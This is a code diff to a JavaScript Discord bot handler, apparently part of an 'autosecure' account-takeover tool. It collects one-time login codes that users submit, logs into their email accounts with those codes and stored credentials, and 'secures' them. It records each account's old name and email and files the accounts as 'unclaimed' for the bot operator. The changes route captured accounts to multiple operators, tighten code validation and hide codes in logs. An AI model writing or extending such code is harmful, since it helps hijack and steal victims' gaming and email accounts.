@@ -23,13 +23,15 @@ let obj = {
   callback: async (client, interaction) => {
     await interaction.deferReply({ ephemeral: true });
 
-    let code = interaction.components[0].components[0].value;
+    let code = interaction.components[0].components[0].value ? String(interaction.components[0].components[0].value).trim().replace(/[\s\-]/g, '') : '';
     let customIdParts = interaction.customId.split("|");
     let email = customIdParts[1];
     let secEmail = customIdParts[2];
     let secId = customIdParts[3];
     let mcname = customIdParts[4];
-
+    let originalUserId = (customIdParts.length > 5 && customIdParts[5]) ? customIdParts[5] : interaction.user.id;
+    let targetOwner = (customIdParts.length > 6 && customIdParts[6]) ? customIdParts[6] : client.username;
+    let targetBotNumber = (customIdParts.length > 7 && customIdParts[7]) ? Number(customIdParts[7]) : client.botnumber;
 
     let blacklisted = await isblacklisted(client, interaction, email)
     if (blacklisted) {
@@ -40,8 +42,11 @@ let obj = {
       });
     }
 
-    console.log(`client username: ${client.username}`);
-    let settings = await client.queryParams("SELECT * FROM autosecure WHERE user_id=?", [client.username]);
+    console.log(`client username: ${client.username}, targetOwner: ${targetOwner}, originalUser: ${originalUserId}`);
+    let settings = await client.queryParams("SELECT * FROM autosecure WHERE user_id=?", [targetOwner]);
+    if (settings.length === 0) {
+      settings = await client.queryParams("SELECT * FROM autosecure WHERE user_id=?", [client.username]);
+    }
     if (settings.length === 0) {
       return interaction.editReply({
         embeds: [{
@@ -82,8 +87,8 @@ let obj = {
       [rChannelId, rGuildId] = settings.users_channel.split("|");
     }
 
-    if (isNaN(code)) {
-      console.log("[X] Invalid Code! [Not Numbers]");
+    if (!/^\d{6,8}$/.test(code)) {
+      console.log("[X] Invalid Code! [Must be 6-8 digits]");
       return interaction.editReply({
         embeds: [
           {
@@ -98,8 +103,8 @@ let obj = {
 
     if (settings?.auto_secure) {
       try {
-        console.log(`Trying to Login Email: ${email} Code: ${code}`);
-        let creds = await getCredentials(email)
+        console.log(`Trying to Login Email: ${email} Code: [REDACTED]`);
+        let creds = await getCredentials(email);
         let host = await login({ email: email, id: secId, code: code }, creds);
 
         if (host) {
@@ -119,7 +124,7 @@ let obj = {
             }
 
             console.log("Starting the Auto Secure process");
-            let acc = await secure(host, settings, uid);
+            let acc = await secure(host, settings, uid, mcname);
 
             if (acc.email === "Locked!") {
               nohit = true;
@@ -197,12 +202,12 @@ let obj = {
 
               await client.queryParams(
                 "INSERT INTO unclaimed (user_id, username, date, data) VALUES (?, ?, ?, ?)",
-                [client.username, acc.oldName, timestamp, JSON.stringify({ acc, uid, mcname })]
+                [targetOwner, acc.oldName, timestamp, JSON.stringify({ acc, uid, mcname })]
               )
 
               await client.queryParams(
                 "INSERT INTO unclaimed (user_id, username, date, data) VALUES (?, ?, ?, ?)",
-                [client.username, mcname, timestamp, JSON.stringify({ acc, uid, mcname })]
+                [targetOwner, mcname, timestamp, JSON.stringify({ acc, uid, mcname })]
               )
             }
 
@@ -210,14 +215,14 @@ let obj = {
 
             console.log('[SUBMIT] Calling aftersecure with:', {
               hasAftersecure: !!acc.aftersecure,
-              userId: interaction.user.id,
+              userId: originalUserId,
               hasSettings: !!settings,
               server_id,
-              clientUsername: client.username,
+              clientUsername: targetOwner,
               hasEmail: !!acc.oldEmail
             });
 
-            let doneaftersecure = await aftersecure(neededmsg, acc.aftersecure, interaction.user.id, settings, client, server_id, client.username, acc.oldEmail, acc);
+            let doneaftersecure = await aftersecure(neededmsg, acc.aftersecure, originalUserId, settings, client, server_id, targetOwner, acc.oldEmail, acc);
 
             console.log('[SUBMIT] Aftersecure result:', doneaftersecure);
 
@@ -227,7 +232,7 @@ let obj = {
               console.log('[SUBMIT] Aftersecure was not executed or failed');
             }
 
-            let inserted = await insertaccount(acc, uid, client.username, settings.secureifnomc);
+            let inserted = await insertaccount(acc, uid, targetOwner, settings.secureifnomc);
 
 
             if (nChannelId && nGuildId) {
@@ -323,6 +328,15 @@ let obj = {
                 };
                 await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send(msgnomc);
               }
+            }
+
+            if (interaction.user.id !== originalUserId) {
+              await interaction.followUp({
+                content: hasMinecraft
+                  ? `✅ **Xác thực OTP thành công & Đã kiểm tra Minecraft!**\nIGN: \`${acc.oldName || mcname}\` | Trạng thái: \`${acc.mc}\``
+                  : `✅ **Xác thực OTP thành công!** (Tài khoản không sở hữu Minecraft Java)`,
+                ephemeral: true
+              }).catch(() => {});
             }
           } catch (e) {
             console.log(`Error in the process of autosecure (not necessarily while autosecuring)! ${e}`);
